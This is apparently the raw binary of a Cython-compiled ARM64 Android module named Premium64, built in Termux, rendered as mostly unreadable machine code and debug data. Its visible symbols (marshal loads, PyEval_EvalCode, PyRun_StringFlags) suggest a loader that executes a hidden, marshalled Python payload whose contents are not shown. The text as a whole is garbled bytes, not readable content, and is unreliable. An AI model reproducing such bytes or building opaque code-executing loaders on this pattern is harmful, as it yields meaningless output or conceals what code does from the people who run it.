+@9_�q!T�q�T��R�+9h@9�qTH�Q)1�T�+9h@9�q�T�5��R	�Q?)1CT�/9b���BL3� Մ��0�c��C��#��Rd��c���"�R3�Rc� �7��d�(����*�`���(5���a�(���@*�`���(5���^�(����)�3�sB$���t��@����/�`��(�@���`���|4�O�(��� (�@���`���L:�F� ���'�@� �!~�p��`@�b@�@���7���"@9�&@9(*h4�*@9H4�_�9���^����^�@���T�"�� ���^����^�@���K����_��"���(���^����^�@��?���^����^�@� ����T�
+@����H����C�@��4a�C�`@��@�7� %� աs�0������D� ��r�0���� $�7��%� �R3�R�@����`	����t�D�
+������D�������
+��������������*���?3�RuR3�R5R5��R�D����H�D�H?���(�D���($��c��C��#��� �D�����@�	�
+ 
+@�)�D�_	��T��D�� ��	C��� !T�
+C���� T����@ 5���;��a���!|7��B�@�l���ĀR���3�RÀR���������h@��h�aT��h����@���aT��a���Z�$���@@�A@����
+�7�@���aT��S�H@�I@�
+@�?�!T��D����@�����@�	���I@�!�D��?�����@���aT��9�����D����@��������h���-�&�@�������x��@������T�@����T3�h@��h�aT���j�����@@�A+@���|��@����`�7h-���h��R5ǀRb��uǀR��R�@�����a��T�����@���a��T����3�����RʀRN��3�RuˀRh�������H��3�R���RE��3�Rռ�RB��3�R���R?��3�Ru��R<��3�R���R9��3�R���R6��	�)%��� @�!)@�@�I@���?������@���0��	�q	C�)
+C��@�6��H���aT�@������	C�����T;�9C&�����!@�"@�#� ���h@�
+@�(�@���&3�R�ÀR��3�R�ÀR��`�D�L�	���@����ȀR��R���`�D�#���@�����RuȀR�����RɀR�������uɀR��R���3�R5ˀR�������`��������%��@�)@�BC����*�A��@����q�y�Z�Y4��D��iI�+q�T
+Q+�J	@�_k�T�c��C��#����
+4`���:�a���!|7�b���B�4��*�����������`���3��*���@�������T��Q�D�4�*!��*�
+k
+Tj
+K_qJ����N}|��
+*�in��k���T
+TM�*���	@��*�kJ��_	k*��T	�*�)	@�?k���TI}@�)�|�ii��@����B�D����������������*����@���aT���t��@����
+T���l`���3�a���!|7��*�����
+��A��@������4��D���hI�	qDT
+P)��*J	@�_k�T�4�*
+ ��
+*�k
+T,K�q���v��~|��*Lil��k���T
+T��	*���@��*�k֦��k�T	�6�)	@�?k�T	�)	I�	kAT�|�i�����	�)$�(@� Y�<	�k�T
+}@��~@��(�`�<lA�J�_	�`�=��L��T�~@�		�9	�5�h	�����@����aT�����@���@���AT���@���@���AT���@������D�����@���AT���D����Z�@��_�	�!T�OT��WS��_R��gQ��oP��{O��C��_���R$������$�	�R*�RY�		�
+���W���~@�	�|�hi�h)�	@�)�	�A��T��{�O����{���O���������D�	@���)I@�	� ?�������OA��{¨�_�����@����a���!,5���C�@������OA��{¨�_��{���O�������$���@��@����@�
+@�����@����OA��{¨�_֬������OA��{¨������OA��{¨�_��{�����O���@�����A@�5�`����5����5�������?����������OB��@��{è�_��������OB��@��{è����������OB��@��{è�_��a���!X9�C�@�������OB��@��{è�_��{���_��W��O����A$�@�@�i@�)�i�����@����$T���T�@���yw����� ��5�@��D��B9� 6@�I@�h���?�����������H� ��6��L��������@����T�@����aT�����@���aT����h@����h����T���OC��WB��_A��{Ĩ�_��������OC��WB��_A��{Ĩ�_����{��W��O��C�V�;����@���������B�?�Th@�	�B9�(7	�a���!@6���D������D�"@�����D�D���������@�7	Ј@�)C�	��Ti��� F���	U@���7I�7	�a���!�0�)C�
+@� @���^@�qkT�a���!�:�C�@�c� �R����"������������ �@4����! �R�������U����@��@�	�T���OC��WB��{A����_�����������5��! �R���������U����@������T��<�������������@��@�	��T�OC��WB��{A����_����{���*C�B� � � � ��.C�b� ��2C��� ��6C��� ��:C��� ��>C��� ��BC�� ��FC�"� ��JC�B� ��NC�b� ��RC��� ��VC��� ��ZC��� ��^C��� ��bC�� ��fC�"� ��jC�B� ��nC�b� ��rC��� ��vC��� ��zC��� ��~C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ��D� � ��D�" � ��
+D�B � ��D�b � ��D�� � ��D�� � �
+�			�����o(x	���o��@vX
+ 
+����o�
+�
+8t���o
+���o�
+���o�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^�^��������Android (8490178, based on r450784d) clang version 14.0.6 (https://android.googlesource.com/toolchain/llvm-project 4c603efb0cca074e9238af8b4106c30add4418f6)Linker: LLD 15.0.6clang version 15.0.6$P$�d�4�P�L�d��P�$�0��4cL�c8\PdpP��P��e��e��P��eeL�e� dLxd� eLxe� �Lx���Q�� gLx���P� fLXP f$ldd�d$led�e$l�d��,4QltQ4X�Xlgt��4<P<lft�PXlfp�d��dp�e��ep�����x�Q��Q�����g�����P��f��P��f��d��d��ee��e�4�����Q��Q����e�4e����P�4d��P�d4d4dPdPdP��P���d��
+�P��
+ d�X�P�h���x
+�x
+�
+e�
+�
+��
+ ��X�h�0���
+0��
+�
+0��
+ 0��80�@X0�h���x
+�x
+�
+c�
+�
+��
+ ��X�h�0���	0��	,
+c,
+0
+0�0
+8
+P8
+d
+fd
+x
+0��
+�
+c�
+�
+f�
+ 0��80�@L0�LXPh�0���	0��	�	f�	�	0��	�	P�	
+e
+x
+0��
+�
+e�
+�
+0��
+ 0��0�f00�08f@LPLX0�h�0��	0�	<	d<	h	0��	�	0��	�	P�	
+d
+d
+0�p
+�
+d�
+�
+f�
+�
+d�
+�
+0��
+ 0���0� 0� 0d0@P@LdLX0���@��chc�����������$�$,�,4�48�Pd�d����������������������4���\�\t�t�Y�������(YT��h���(�4DPDdc��0���e��0���P��f��0���d��0���P��c��������0��	0���d��c�	c�0� �0�X�
+0��
+e8T0�T�e��0�@�e�0� �0�X�
+0��
+d8�0�@�0��d �dX�
+d8�d@�d�� ��X����P�� ��X����Q�� ��X����R0XP 0P��P��kT�ft�f��fl	�	X�X|	�	Q�Q�	
+d�
+�
+d
+
+e�
+�
+el����e�0
+eH
+�
+e8Te��ex
+�
+d�
+�
+fx
+�
+d�
+�
+f0DPX\P4DQX\Q8<XDHPH��\`P`l�t����iH
+�
+i���H
+X
+�X
+d
+Zt
+�
+Z�
+�
+����H
+X
+�X
+�
+]�
+�
+���iH
+�
+i��XH
+�
+X��YH
+�
+Y��[H
+X
+[X
+`
+_`
+�
+[�H
+�8\�\dP�����P�H
+�8\�\dQ�����P�H
+�8`�`dR�����d
+
+P
+(
+Q��P�
+0�
+
+P
+H
+f8T0���f�0
+0�0
+H
+e8T0���0��0
+e8Te��e0
+H
+f�
+�
+Zl�P@DPH�Pd�e@�ed�i@�it����f��f���t����[���x�Y��]��Y�ft�f<l<PXP\ZptX��P��X��X��P��c���P��c$�P���X��X��Y��d�d$4P4lclt�P�t�c���P���c���P�LxPXl�0�t��0����0���P��c��P�c$�P�<l�P���Q��d��Q�d�Q�0d0<�Q�<`d`l�Q��l0���ee4e<de��c$c<Xc��c��P�xd��x��xg�4eH`e�e 4e�P (P��X f,4fH`fx�c��dx�c��d��P��d���P���dLXd��d���P���Q� c(c $cL|c��c��0�� d $0�LX0�X�d��0���0���d� e $0�LP0�P�e��0��(0�(�c�cL|c��c��dPXd c|�c��P e|�e%4I?:;$>4I:;I!I7$>4I:;	:;
+ 
+I:;8I:;I
+:;
+I:;8:;&I'II'I:;I:;(
+:;<I'..@�B:;'I:;I4:;I
+:; 1XYW!41"41#$1%1UXYW&1'1XYW(
+1)U*41+��1,��1-���B.���B/4I:;0:;1
+I:;82!I73:;4
+I:;
+85.@�B:;'I?6��1�B7.:;'I<?8.:;'I 94:;I:.:;' ;:;I<.:;'I<?=.:;'<?>.:;'I<??.:;'<?@A.:;'6I B
+:;C.:;'6 DE.@�B:;'6IF���BG��1�BH1UXYWI4:;IJ.:;'6I K:;IL.:;'I 
+=Z
+���H��@�	Ј�Y�	�el
+�S��	0�	whJ
+�K
+BL(
+qBM0
+�nN8
+�
+�
+O@
+��PH
+�T
+QP
+9~RX
++=S`	�
+1	�
+(,
+B-
+V�.
+�n/
+ 
+c0 M>		#d
+nf
+p�gy�������B�o
+���	
+���
+�
+B�
+�n� 
+xn�(
+iL�0
+�n�8
+>h�@
+:	��H
+|��P
+�d�X
+�o�`
+$��h
+���p
+�	�x
+IY��
+c	d��
+j	+	��
+I6	��
+�A	��
+�	M
+��
+�B��
+�T
+��
+�~��
+*�
+��
+[n��
+`�
+��
+��
+��
+Q�
+��
+�(��
+W=��+��Qc�a��1��Yn� ���(���0m�8;=�@h~�H\c�P}c�X�c�`�c�hc�p�
+L�xT�oL��[�%�pm
+Bn
+�noGeW�\cBs.	�xcc�e�l
+��@c�c���
+� �
+���
+��
+)��
+��x
+�cc�"7cc_C�@�I�Vc��tj =
+�9B
+�9C
+t9D
+29E
+�9F 
+�YG(
+�H0
+�I8
+��J@
+�~KH
+��LP
+�9MX
+�9N`
+�9Oh
+�9Pp
+�9Qx
+��R�
+�S�
+0�T�
+a9V�
+�9W�
+!9X�
+�9Y�
+�YZ�
+g9[�
+p9\�
+�
+9]�
+�9^�
+9_�
+�9a�
+�9b�
+�9c��9d��f
+9h#9iD��Icccd��icccc�(��@c��Q	xPl
+�'m
+�9n
+MBo
+>Bp
+��q 
+E	br(
+�s0
+3�t8
+�9v@
+�BwH2"�7ncM��Rccnm9�r@cnc����@cc���~z
+
+'{
+y9|
+�}����@ccc	��	 	cn?�Dv	����F	Q	M��
+*n	�
+�
+1
+�y	�
+6~	@c�	@�	�	
+!P
+��
+7c
+-n
+�n
+�@ 
+�@$
+F�(
+?,
+0
+�
+,
+8
+U,
+@
+�� Hn<
+�7A
+c�	�_
+��d
+@cy
+��
+��
+@c��
+��
+ccc@E����
+�
+				 6
+B7
+�8
+@9
+�B;D-8	BM		(
+
+�B
+
+��
+ 
+
+��
+
+�B
+
+�
+ ��
+�cc���
+	�@cc�d��3��@��c�n#g�(c�ccHt�M�If�9kcc��c�cM
+C.�c��	
+	<
+@=
+!�>�
+��	؈�
+l�
+ 
+�	���l+
+�	<elI
+�	delg
+�	�elI
+�	0�
+�	�el	I
+�	��
+�	�el�
+�	�el�
+�	A2�	Ȉ&�
+C�J
++C�	�el_ c��#y�	telR��	Jel�
+
+	�	�el�	�el
+0Lp
+m
+�@A�C�#`�cC�#h9��c�e�@c	9�B�	j�@w
+$	�c���c���c�a4UDmY w/�L��!��/"Q�/"��/"��/"K�/#DM$!��/!��/ $�N$d$ $�N$P$ $O$P$%$�$P$ 0PO� �/PO�#&��/#,P4$�c'0`P%%30�9&�A0&�M0&\Y0"Ze0"�q0"�}0"�0"��0(�0�Q �$�Q�'$$�QZ	 �$�Q�'$$�QZ	%�0 g&��0"'�0"��0"[�0"�1"�1"d 1(,1�V%51p&dO1"�[1")g1"�s1"�1"C�1)�"��1%�1�e!&d�1&��1"��1%$$ h	&Q-$%�1P&u�1"[�1*�1%
+2��&�2&�#2&�/2"�;2" G2"$S2%`2�&�n2&�z2"�2"��2(�2�X%�$�$f�$%$$ Z	&8-$ �$�X$f�$ $$�XZ	$f-$%�2P%	&��2&��2"~�2") �2"� �2 
+2pW|�$P2$X#2$i/2"3;2"�G2"�S2#tY("� 3 $$�Y�	&!-$)�"_ 3 �$�X
+$P�$ $$�XZ	$P-$ �$�X 
+$P�$ $$�XZ	$P-$ �$�X!
+$d�$ �$�V1$e�$ $$�VZ	$e-$ �$W2$d�$#�X� ic'$$�Xi $$ R<$d-$ $XRC$d$%�1�E&��1"��1'$$�RG $$�RJ$f-$%$$N&�-$%$$@O&.-$ $$SR$c-$ $$TS\$f-$ �$tSb&��$ $$tSZ	&.-$ �$�Sd'$$�SZ	 �$4Uc'$$4UZ	+�.�L+!3�L,,3�L-T;-S3-Q5-P�,,3TN-Q�-U�-S�-P�,I3hN-R1-Q�+d3tN+u3�N+�3�N,3/�N-P�+�3�N+�3O+�3DO+�3pO+u3�O+�3�O+�3�O+4�O+4(P+/40P+:4DP,D/\P-P�,P4xP-P1+b4�P+3/�P+s4�P,~4�P-S�-R�-Q�-P�+�(Q,�4$Q-R�-Q�-P�,�4|Q-P�+�4�Q+�.�Q,�4R-R�.X�R,�4�R-P�+�5�R,�7�R-Q�-P�+s4,S,�4DS-R�.X@T,�4TT-P�+�9�T+L:�T+c:U+L:XU+p/dU+4�U+�:�U,�4�U-R�-Q�-P�,;V-S�+;V,&;$V-R�,A;�V-Q�-P�,a;�V-P�,&;LW-R�+�:`W+r; X,�;DY-P���
+DM
+�
+,�g	�(�
+	kelF�
+	�elL��	�/�
+p�Bl�	c��#c��# �c��#(�c��#0{c��#8�c��#@T"�	�r.l
+:e�0(�1_�1B�1���1(B�1	G� 1�
+G�!1�
+G�"n�c��#�5��	�Gl
+�
+c��#�F
+�	Glc��#�FE�	G2l��c�	�����	�4Gl+��	�4Gl]��	�4Gl	n��	5GlT��	5���	5/9B�/j@�/e@�Hc��#H�c��#Pc��#X��	Kel�c��#p�+	qel�2	Vel+&c��#x&@	�el(DN	�el<bg	7el=�c��#�A�_�#��c_�#�W��&���#��#��3�}1z@~1'@1h �$ 0 :|0y1�P z1"@{U ` �		��g
+g
+�cg
+cg 
+�
+cg(
+n@g0
+��!g4
+�
+�!g6
+&@g8
+1@g<
+�@g@
+�@gD
+�@gH
+1@gL
+�@gP
+@gT
+~@gX
+�@g\
+@cg`
+�	cgh
+�	cgp
+�cgx
+�cg�
+wcg�
+�cg�
+cg�
+��g�
+�@g�
+��g�
+�g��g
+�	��!�	(el/�B�
+""w0
+B
+Dn
+��
+aY" 
+.n"(^"i"2�	s"~"
+�"�"G�0H
+B�
+�n�
+s 	�
+��"� �48T�4�
+T�4�T�4)T�4�T�
+,$#�()#TLJ9#D#k(
+
+_
+an w#�#�(
+
+� 	
+�� 5�HoS�c6�#I7�(c�#�#�w	8��@9�	�:��;��c:�;�c8��@;��c;i�c;��B;�	�B;��@9�@9!�c:W;�WcI(mQ
+�c��c;���#u��c���cNi�ce��K%�#�	"�$ $xI�$c$%$$0�&+-$%:$`�	&�G$&�S$&P_$&w$"s�$"��$%$$��	&	-$%:$��	&,G$&bS$&�_$&�w$"�$"U�$%$$��	&�-$%:$ �	&�G$&�S$&g_$&-w$"��$"��$%$$P�	&3-$%:$��	&VG$&�S$&_$&�w$"E�$"��$ $$�J8�	&-$ �$�K�'$$�KZ	+�($I+�.,I+�.\I,/�I-P�+"/�I,3/�I-P�,/�I-P�,D/J-R�-P�,/0J-P�,D/LJ-R�-P�,/|J-P�,D/�J-R�-P�,/�J-P�,D/�J-R�-P�+_/XK+p/`K,/pK-P�+_/�K+p/�K,/�K-P�+_/�K+p/�K,/�K-P�+_/�K+p/�K<x<�(�(�(z	
+�hR
+C�(U
+��(V
+U�*W
+�@]
+/@`
+�@b 
+�@c$
+�@d(
+�@i,
+�	@j0
+�*n8
+x�-p@
+��-qH
+3crP
+�csX
+cv`
+mcwh
+�cxp
+��-}x
+�c�
+�@��
+�c��
+1M
+��
+eM
+��
+
+@��
+�c��
+�H��
+N���
+�@��
+�c��
+*c��
+vc��
+����
+M���
+~�-���.�(�_�0E_�8)
+�-�@��*�P�*�*	��*�*�5	�&
+A'+1
+�D+3
+��-42+H
+;=+�
+%I+	�P/
+1�+1
+�c2
+�c3
+�c4
+�P 5 
+�
+�,6(
+�D+80
+z^-=8
+�@>@
+��-?D
+_e@E
+�R-BH�+�+~;�$
+B%
+Sc&
+�c&
+pc& 
+7c&(
+�c&0
+�
+c&8
+Uc&@
+	c&H
+`c'P
+ic(X
+�c)`
+�c*h
+�	c+p
+s[,x
+��,4��,�
+ATq
+)�,�,�		�8
+B
+��,
+D+
+ec 
+�	@(
+�e,
+e-
+�e.
+�R-0clc-n-\y-E
+>�-T
+'���*�-��-@c�,@c�-�-|I	�7
+�cE
+��-G�-.�
+"0
+*P  
+�.!*.��	�(�
+�@�
+P@�
+�@�
+�c.�	8�
+W@�
+��.�
+��.��.'+�.�.�P	
+ K
+��.L
+@�M
+>�N
+�R-O�.7�$�*=;
+cB>
+!ccB73
+cc7Bcc7]:@cBc7�
+'@c?P8��
+@9��
++
+9��
+@9��
+B9K�
+@9��
+@@9��
++
+9�
+�/el�A�@;/0.8'"@B�%8
+@B�A1�c;��c;M�c;
+�@9@�c9��c9��c9K�c9r�cBe�C9;�B;�@;i@;iB9qP 9U�,9��(9�c9�c9WcBe0ALR@;�R�(;�R@9�Tc9�Tc9WTc9�V_9�Sc@9ec8V�c;7�c;��c9���8$�P ;"�@9 
+�@9��P 8{@;h{ ;z{@;"{@9;|@9r|@9F
+|@A��P ;��B;��@;i�@;i�B9�c9q�P Be:?�;"�@;��P 9h� 9 
+�@9K�@@9$
+�P @9w�@<�6B>�=@��BD7�@cBn7�cn7X"cBn7�cBn7r+cB>�"@cBc>�cB>�fcBnBB>�- 	c>\%@ccc<�"c7#9ccB7b#cnD7�cn<	c7�<ccccc@=8___>�0@c<	c7�@cccE�Z�m^&cH#d&c�#�&c�$�&c�$�(Y%'c+�;�ZFe�Z-Q�-P�+�;�ZG�;[-Q�-P�+�4[+�.P[h[\mr�cc%d
+�c�%��c�%K�ne�\\ $�[�$c$)��%��c)��&!�c%�;�&`&�;&*&�; �1�[�$P�1$e�1"�&�1 $$D\�$f-$ $$0\�$d-$ �$\\�$d�$ $$\\Z	$d-$ �$t\�&'�$ $$t\Z	&8'-$+	<�[,<�[-Q�-P�FX�[-Q�,�4\-R�-Q�-P�,L:$\-Q�E�\mE9cn'�9c	(d
+9c�)�9c�(*<�);cP*:cBexH1<PK	)�I�yW�<%U<�l&*a<%�$�u	&�*�$ $$|^Z	$e-$+m<D],�4T]-Q�-P�+�;�]+�.�],x<�]-P�,�<�]-P�,�<^-S�-R�-Q�-P�-T�,�<X^-P�,�<t^-S�-R�-Q�-P�,�<�^-R�-Q�-P�E Zxm�c8"�c�"=;�_�"c $XZ$P$+�4tZGc:�Z-P�>�$ccc�Y�mx�c4!��c"�c%�1p�&�!�1"�!�1.Y�Y+L:�Y,�;Z-R�=ccc>dcBD>�YBc7J
+�P BB@7(
+ 	�,�(P cc7y!	@�,7�"6���7m"4��7��ccBD7o#M@B?z#N7�$�cccc8�~c;�~c;�~c>4
+9cc7�"@ccJ��@K��cK���L�#�K�#c<	#)c>.�cc7�%@�<�<�<�&&
+�@&
+�@&7�',cB@cc�<7A
+#
+cccc�$dhl����� Ld $ld�PTXlp��������4��(,4<�����	� �X�@�� �X� �Xl4HX`lpt���H
+�
+��H
+�
+�H
+8T��(
+,
+0
+H
+(
+,
+0
+H
+d�@�04<h	l	p	x	|	�	��	�	�	
+�
+�
+ 
+
+�
+�
+�������4H`�4H`��� 4\`dht�� P���TX |�__pyx_moduledefnb_reservednb_inplace_ortp_richcomparem_clear__pyx_dict_version__pyx_string_tab__Pyx_StringTabEntrycountco_warmup__pyx_cfilenmob_svalnextf_codepreviousgilstate_counteropaquert_from_callPyErr_WarnExnb_rshiftnb_inplace_powermp_ass_subscriptPyCFunctionPyMemberDeftp_basedescrsetfuncinitprocunsigned intm_init__pyx_k_main__pyx_linenoPyDictObjectPy_DECREF__Pyx_copy_spec_to_module_framec_traceobjPyMem_ReallocargcharPy_ssize_tsq_lengthsetattrofuncitemsizegetdescrgetfuncm_copym_namesco_code_adaptivema_valuesinterneduse_tracingidar_endcomputed_linebadpy_linepy_codePyTraceBack_HerePyDict_ContainsPy_IS_TYPEPyCompilerFlagsssize_ttp_vectorcall_offsetnb_lshiftssizeargfuncsq_inplace_repeatbufdocPyGetSetDef__pyx_kp_b_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d__Pyx_CodeObjectCacheEntryinterp_Py_CODEUNITfilenamestart__Pyx_GetBuiltinNamenb_subtractnb_intnb_floor_divideobjobjargproctraverseproc__pyx_moduledef_slotsn__pyx_k_importco_consts_co_linearray_dictvaluesob_itemPyInterpreterStatef_func_opaquesizedatastack_limitpy_frame__Pyx_PyObject_Call__Pyx_Globalssq_concatsetter__pyx_empty_unicodePyCodeObjectreadyf_builtinsf_trace_linesis_entry_BoolPy_tracefunc_tsattr_namePy_GetVersionPyDict_New_py_tmptp_nametp_as_sequencesq_containsPy_hash_ttp_calltp_methodstp_bases__pyx_clinenohashc_profilefuncdictPyObject_SetAttrStringPyObject_HashPyBytes_AS_STRINGPyEval_MergeCompilerFlagsam_awaitnb_xorsq_inplace_concattp_hashml_flagsslot__pyx_empty_bytesco_argcountPyDictKeysObjectprevuint8_tPyErr_ClearPyObject_SetAttrPyMem_MallocPy_LeaveRecursiveCall__Pyx_GetAttrobtype/sdcard/Premium64.cnb_invertPyMappingMethodsreleasebufferproc__pyx_k_testshortco_stacksize_co_coderesultf_trace_opcodes__Pyx_InitGlobals__Pyx_AddTraceback__Pyx_CLineForTracebackPyUnicode_FromFormatcftp_as_asyncnb_addnb_powerternaryfunctp_as_buffernameuint64_t__pyx_n_s_importco_nlocals__Pyx_CodeObjectCachePy_INCREFop_iscframefunc_closuref_framecurexc_typeasync_gen_finalizertopPyModule_GetDictPyInit_Premium64functp_deallocnb_multiplynb_indexndimset__pyx_n_s_testco_namespecfunc_codefunc_weakreflist_f_frame_datadatatp__Pyx_CreateCodeObjectForTracebackPyErr_OccurredPyEval_GetBuiltins__pyx_t_3getattrfunctp_setattrsq_ass_itemPySequenceMethodstp_strtp_getattrogetattrofunctp_flags__pyx_empty_tupleco_localspluskindsco_filename_dictkeysobjectcurrent_idto_nametracing_whatfunc_annotationsf_linenotrash_delete_nesting_stack_chunkexc_statePyModule_NewObjectendPyCode_NewEmptyclang version 15.0.6__kernel_long_tmp_lengthgetbufferprocbf_releasebuffertp_delm_methods__pyx_methodsis_strinternco_exceptiontableframe_objPyTraceInfoPyErr_ExceptionMatches__pyx_bisect_code_objectsPyUnicode_AsUTF8String__Pyx_PyExec3__ARRAY_SIZE_TYPE__nb_inplace_lshiftmp_subscriptgettertp_subclasses__pyx_dict_cached_value__pyx_n_s_maincode_objectco_weakreflisttracinglocalsplus_PyCFramecontext_vermessageob_basePySendResultnb_inplace_matrix_multiplysq_itemformatPyBufferProcstp_weaklistoffsettp_newfreefunctp_mrotp_vectorcallm_slots__pyx_cython_runtime__pyx_n_s_loadsfunc_moduleuint32_tf_globals_PyInterpreterFramecurexc_tracebackPyObject_GetAttrStringlevelpostmpPyFrame_NewPyObject_DirPyEval_EvalCode__pyx_pymod_createglobalssetattrfuncunaryfuncPyAsyncMethodsnb_inplace_andstridesPyModuleDef_Base__pyx_f__pyx_n_s_cline_in_traceback_co_linearray_entry_sizekindfunc_defaults__Pyx_InitCachedConstants__pyx_find_code_objectmid__pyx_insert_code_objectPyBytes_FromStringAndSizePyImport_AddModulePyUnicode_AsUTF8PyRun_StringFlagsbinaryfuncnb_inplace_floor_divideinternal_typeobject__pyx_d_co_firsttraceableco_extraPyDictValuesPy_XDECREFunsigned charcodet__Pyx_Importtp_getattrPYGEN_RETURNPYGEN_NEXTnb_inplace_addnb_inplace_rshifttp_clearint64_t__pyx_n_s_builtinsco_firstlinenoco_nfreevarsco_qualnamerecursion_limitcurrent_framefound_dotmodulec_linePyErr_Restoredict_versionob_refcntam_anextnb_remaindershapegetiterfunctp_dicttp_dictoffsetnewfunctp_finalize__pyx_bco_kwonlyargcountma_version_tagcompactfunc_versionexc_infoar_line__Pyx_InitStrings/storage/emulated/0__pyx_module_is_main_Premium64m_basenb_positivelenfuncbf_getbufferobjtp_freesize_t__int64_t__pyx_k_nameallocatedPyListObjectPyThreadState_Getfunc_builtinsf_backexc_value_line_offsetsrtversionpvaluePyErr_FormatPyObject_Call__kernel_ssize_thashfunctp_iternextPyMethodDefpco_nplaincellvarsascii_staticfunc_qualnameuint16_ton_delete_dataPyDict_SetItemStringlistnew_maxPyUnicode_FromStringAndSizePyUnicode_DecodePyList_New__pyx_t_1dict_cached_valuenamesreprfuncnb_boolwas_sq_sliceunsigned longrichcmpfuncml_nameco_namescode_linewstrthread_idPyErr_SetStringifrom_listptracebackPyTuple_PackPy_EnterRecursiveCallmoduleskwPYGEN_ERRORnb_inplace_subtracttp_as_mappingiternextfuncml_doctp_alloctp_cachem_indexm_sizem_traverse__uint64_tis_unicode__pyx_n_s_marshal__pyx_tuple_c_profileobjempty_dictempty_list__Pyx_PyObject_GetAttrStrob_typetp_itemsizetp_memberstp_initvectorcallfunclengthstateob_shashPyModuleDef_InitPyFrameObjecton_deletePyCodeAddressRangefuncnamepy_funcname__pyx_pymod_exec_Premium64inquirynb_floatssizeobjargproctp_setattrosuboffsetstp_itertp_is_gcm_docPyModuleDefPyBytesObject__Pyx_check_single_interpreterrecursion_headroomf_localsboundsar_startlo_nextPyInterpreterState_GetIDtstateam_aiterPy_buffertp_weaklist_object__pyx_k_loads__pyx_filename__pyx_n_s_name__pyx_code_cacheentriesfunc_nameprev_instrc_tracefuncprevious_item_err_stackitemcython_runtime_dictPyImport_GetModuleDictcallobjobjprocreadonlytp_docml_methallocfunctp_version_tagPyModuleDef_Slotm_freemain_interpreter_id__pyx_k_d_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d__pyx_k_marshalco_ncellvarsfrom_namerecursion_remaining__uint8_tunsigned shortasync_exctrash_delete_latercoroutine_origin_tracking_depthlimitdatastack_chunkuse_cline_objPyDict_GetItemStringPyErr_Fetch__pyx_L0sq_repeattp_getsettp_descr_getco_flagsco_linetableallow_none_initializedasync_gen_firstiterroot_cframectversion__pyx_L1_errorPyOS_snprintfcf_feature_versiondeflocalsdestructorsendfuncnb_negativenb_inplace_multiply__pyx_k_builtins__pyx_k_cline_in_tracebackma_keysmoddict__uint32_t_PyErr_StackItemdatastack_topsameglobal_dictptypeuse_clinePyTuple_Newtp_basicsizenb_absolutenb_ornb_true_dividetp_traversevisitprocclosurePyTypeObjectvaluemax_countco_nlocalsplusco_localsplusnamesfunc_globalsfunc_docfunc_dictvectorcallPyFunctionObjectf_fast_as_localsstacktopPyObject_NotPyObject_GetAttrcf_flags__pyx_pyinit_moduleintam_sendtp_as_numbernb_inplace_xorPyNumberMethodswas_sq_ass_slicelentp_descr_setPyObjectPyASCIIObjectfunc_kwdefaultsf_tracecurexc_valuePyThreadStateo__Pyx__GetModuleGlobalName__pyx_t_2longob_sizePyVarObjecttp_reprnb_divmodnb_andnb_inplace_remaindernb_inplace_true_dividenb_matrix_multiply__pyx_mencodingco_posonlyargcountma_usedwchar_t__uint16_townernative_thread_idcontexttrace_info_PyStackChunk__Pyx_check_binary_versionPyUnicode_InternFromStringPyImport_ImportModuleLevelObjectPyDict_SetItemmodname&��
+/sdcard/data/data/com.termux/files/usr/include/asm-generic/data/data/com.termux/files/usr/include/sys/data/data/com.termux/files/usr/include/python3.11/data/data/com.termux/files/usr/include/python3.11/cpython/data/data/com.termux/files/usr/lib/clang/15.0.6/include/data/data/com.termux/files/usr/include/data/data/com.termux/files/usr/include/python3.11/internalPremium64.cposix_types.htypes.hpyport.hobject.hobject.hpybuffer.hmethodobject.hpytypedefs.hdescrobject.hstddef.hmoduleobject.hstdint.hcode.hdictobject.hunicodeobject.hlistobject.hbytesobject.hpystate.hpystate.hfuncobject.hpycore_frame.hpyerrors.hdictobject.hpylifecycle.hwarnings.htupleobject.hbytesobject.hunicodeobject.himport.hlistobject.hframeobject.htraceback.hpymem.hceval.habstract.hceval.hcompile.hpythonrun.h	�H�
+ 
+(�6
+]tKJJ	K��
+
+�	I
+�	��tJ�J]J	#JL��xJ��	��tJ�J	�xJ�J	�xJ�K��K	��tJ�J	��tJ�J	�x<�J	�xJ�K�{��J	��tJ�J	�x<�J	�xJ�K�{��J	��tJ�J	�x<�J	�xJ�K�{��J	��tJ���	�xt��{J���K�{��J'dt�J	KxJ	�'O�J	KxJ	�'O�J	KxJ	�'O�J	KJ	�xt��{��Jz
+	$�t��JJ	K�J���tJ ����
+�NJ~
+JNJ~
+JNJ~
+JNJ�j��$+J	R��J�j��JzJJ�j�.�J�zJJ�j��JzJJ�j�.���zJJ��j��JzJJ.��zJJ��jJ.���	L$�u<N�+�K�=�K�A�J
+
+�vJ�wJ
+��J,J�wJ
+���@��wJ���MJ�wJ�J�w���7JJJ�sJ�� JJ
+JKJ7KJ�iJ��J8�:JJ�iJ��J
+J�i���K�i���Jz��iJ��J
+JLJh�J�v��#KJ	JJN7J
+K�s�
+�J	JK<"�}J�"�JJ�JJ�J�J�J
+K�rJ$�
+JJ	K�rJ�
+J	�J�r���J	K��J	�~J�J	�~JM0�J	KK��N$�2�=�@��q���JKJ���sJ	�(�K?�@J�K;��L�JJJJ	�wJ�K���w��	�4�J�J	zJ4�J	�JK�rJJ�J	�wJ�K.��J.JJ�sJG���sJ	�JK��$J�sJ�J	�w��J	�wJ�J��J	�wJ�K��0J�sJ�JJJ�s���	�wJK�{��<����K���sJ	�<�{J;�TQ��~J	KJK�rJ�J�qJ�J	�u��
+J	�uJ��{J�J�{J�J$�	m�0�q��t�s��
+J�rJJ�J�sJ��@��sJ	�<�{��
+t�rJ�J	N�qJ!�J�!J7JJ�q��J&���~�!J	JPM)fJK.J	���E�O
+��pJ�J
+K�pJ�J	�t��J	�tJ�K�{��J�qJ���%J�&K
+��K�pJ#���	J1
+J4�	�4�1��pJ	��G	BLIK	�sJ�K?��{J��
+�	R�~��pJ	�JPJ)LJK.J	���qJ���%J�&K
+��K�pJ#���	J('J+�	�4�	�2�9L0I
+L"M�"G$KL=�IK���HKK�pJ	�J�K
